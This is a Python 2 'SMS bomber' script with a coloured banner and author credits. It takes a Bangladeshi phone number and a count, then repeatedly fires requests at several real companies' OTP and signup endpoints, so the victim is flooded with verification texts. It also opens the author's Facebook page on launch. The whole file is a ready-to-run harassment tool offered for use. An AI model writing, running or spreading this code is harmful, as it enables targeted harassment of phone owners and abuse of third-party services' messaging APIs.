#!/usr/bin/python2
# -*- coding: utf-8 -*-
#Open Source
import requests,os,sys,time
logo = """
\033[1;90m ::::::::  :::    :::     :::         ::: ::::::::::: :::::::  
\033[1;94m:+:    :+: :+:    :+:   :+: :+:      :+:      :+:    :+:   :+: 
\033[1;93m+:+        +:+    +:+  +:+   +:+    +:+ +:+   +:+    +:+  :+:+ 
\033[1;91m+#++:++#++ +#++:++#++ +#++:++#++:  +#+  +:+   +#+    +#+ + +:+ 
\033[1;92m       +#+ +#+    +#+ +#+     +#+ +#+#+#+#+#+ +#+    +#+#  +#+ 
\033[1;95m#+#    #+# #+#    #+# #+#     #+#       #+#   #+#    #+#   #+# 
 \033[1;96m########  ###    ### ###     ###       ###   ###     #######  
 
 \033[1;32mITS \033[1;36mNOT \033[1;33mFOR \033[1;35mNAME \033[1;35mIT'S \033[1;37mBRAND
                                                       
                                                       
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;33m [✓] AUTHOR   : SHA4T0
\033[1;34m [✓] GITHUB   : \033[41m\033[1;37mSHA4T0\x1b[0m    
\033[1;35m [✓] Facebook :  Shanto Khan
\033[1;36m [✓] POWER  : \x1b[1;32m SHA4T0\x1b[1;97m  
\033[1;37m------------------------\033[1;37m------------------------  """
os.system('xdg-open https://www.facebook.com/SHA4TO.VAU')
def sms_bombing():
    os.system('clear')
    print logo
    print ""
    number= raw_input("\033[1;33m[+]\033[1;32m ENTER NUMBER \033[1;31m(Without +880) \033[1;32m: \033[1;36m")
    print ""
    limit= input("\033[1;33m[+]\033[1;32m ENTER SMS LIMIT : \033[1;36m")
    print ""
    print "\033[1;31m[~] \033[1;33mSOON \033[1;32m"+str(limit)+" \033[1;33mMSG WILL BE SEND \033[1;31m[~]"
    
    api="https://www.bioscopelive.com/en/login/send-otp?phone=880"+number+"&operator=bd-otp"   
    data = {
            'phone_number': '+880'+number
          }
          
    from requests.structures import CaseInsensitiveDict
    
    url = "https://api.bdtickets.com:20100/v1/auth"

    headers = CaseInsensitiveDict()
    headers["Content-Type"] = "application/json"
    data = "{\"phoneNumber\":\"+880" + number + "\"}"
          
    for sms in range(limit):
        resp = requests.post(url, headers=headers, data=data)
        requests.get(api)
        respnse = requests.post('https://api.redx.com.bd/v1/user/signup', json=data)
        data={"query":"\nmutation CreateOtp (\n    $phone: PhoneNumber!\n    $country: String!\n    $uuid: String!\n    $osVersionCode: String\n    $deviceBrand: String\n    $deviceModel: String\n    $requestFrom: String\n) {\n    createOtp(\n        auth: {\n            phone: $phone,\n            countryCode: $country,\n            deviceUuid: $uuid,\n            deviceToken: \"\"\n        }\n        device: {\n            deviceType: WEB\n            osVersionCode: $osVersionCode\n            deviceBrand: $deviceBrand\n            deviceModel: $deviceModel\n        }\n        requestFrom: $requestFrom\n    ){\n        statusCode\n    }\n}\n","variables":{"phone":number,"country":"880","uuid":"64b9bb81-93f3-4757-9e92-9cfbf34d8039","osVersionCode":"Linux armv8l","deviceBrand":"Chrome","deviceModel":"89","requestFrom":"U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s="}}
  
        res=requests.post("https://api-v4-2.hungrynaki.com/graphql", json=data)
        sms_limit = str(sms+1)
        print ""
        print "\033[1;31m--------------------------"
        print (str(sms_limit)+" SMS SEND SUCCESFUL")
        print "\033[1;31m--------------------------"
        if sms_limit == limit:
           os.system('xdg-open https://www.facebook.com/SHA4TO.VAU')
def intro():
    os.system('clear')
    print logo
    print ""
    print ("\033[1;31m[1] \033[1;32mSTART BOMBING \033[1;31m(Only For Bangladesh) ")
    print ("\033[1;31m[2] \033[1;32mHELP ")
    print ("\033[1;31m[3] \033[1;32mEXIT ")
    print ""
    user_choise = raw_input("\033[1;34mAttck\033[1;31m>>  ")
    if user_choise == "1":
       sms_bombing()
    elif user_choise == "2":
         os.system('xdg-open https://www.facebook.com/SHA4TO.VAU')
    elif user_choise == "3":
         os.system('clear')
         print ('Thanks For Using :)')
         
    else:
       print ('INVILED CHOISE ! ')
     
intro()

